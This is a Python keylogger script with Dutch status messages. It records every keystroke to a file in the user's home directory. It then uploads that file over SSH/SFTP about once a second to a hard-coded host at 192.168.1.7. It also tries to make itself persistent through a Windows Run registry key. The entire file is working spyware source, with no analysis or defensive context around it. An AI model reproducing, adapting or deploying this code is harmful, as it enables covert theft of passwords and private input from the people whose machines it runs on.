import os
import sys
import getpass
import logging
import subprocess
from pynput.keyboard import Listener
from paramiko import SSHClient, AutoAddPolicy
import socket
import time
import platform

is_wine = platform.system() == "Windows" and "wine" in platform.version().lower()
current_user = getpass.getuser()
if getattr(sys, 'frozen', False):
    script_location = os.path.dirname(sys.executable)
else:
    script_location = os.path.dirname(os.path.abspath(__file__))
home_dir = os.path.expanduser(f"C:\\users\\{current_user}") if is_wine else os.path.expanduser(f"~{current_user}")
log_file = os.path.join(home_dir, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s")

def log_keystroke(key):
    try:
        key = key.char
    except AttributeError:
        key = f"[{key}]"
    logging.info(key)

def send_log_back(host, username, password, remote_path="C:\\Users\\nezir\\Downloads\\keylogger\\dist"):
    try:
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        ssh.connect(hostname=host, username=username, password=password, timeout=10)
        sftp = ssh.open_sftp()
        remote_file = os.path.join(remote_path, f"{current_user}_keylog.txt")
        sftp.put(log_file, remote_file)
        sftp.close()
        ssh.close()
        print(f"[INFO] Logbestand succesvol verstuurd naar {host}:{remote_path}")
    except socket.error as e:
        print(f"[ERROR] Kan geen verbinding maken met {host}: {e}")
    except Exception as e:
        print(f"[ERROR] Fout bij het versturen van logbestand: {e}")

def setup_persistence():
    if "wine" in sys.platform:
        try:
            registry_command = [
                "reg", "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "Keylogger",
                "/t", "REG_SZ",
                "/d", os.path.abspath(sys.executable),
                "/f"
            ]
            subprocess.run(registry_command, check=True)
            print("[INFO] Persistentie ingesteld via Windows-registers.")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Fout bij het instellen van registers: {e}")
    else:
        print("[INFO] Geen Wine-omgeving gedetecteerd. Overslaan van register-persistentie.")

if __name__ == "__main__":
    ssh_host = "192.168.1.7"
    ssh_user = input("username: ")
    ssh_password = getpass.getpass("password: ")
    if not is_wine:
        setup_persistence()
    with Listener(on_press=log_keystroke) as listener:
        try:
            while True:
                time.sleep(1)
                send_log_back(
                    host=ssh_host,
                    username=ssh_user,
                    password=ssh_password,
                )
        except KeyboardInterrupt:
            print("[INFO] Keylogger gestopt.")
        except Exception as e:
            print(f"[ERROR] Fout opgetreden: {e}")
        listener.join()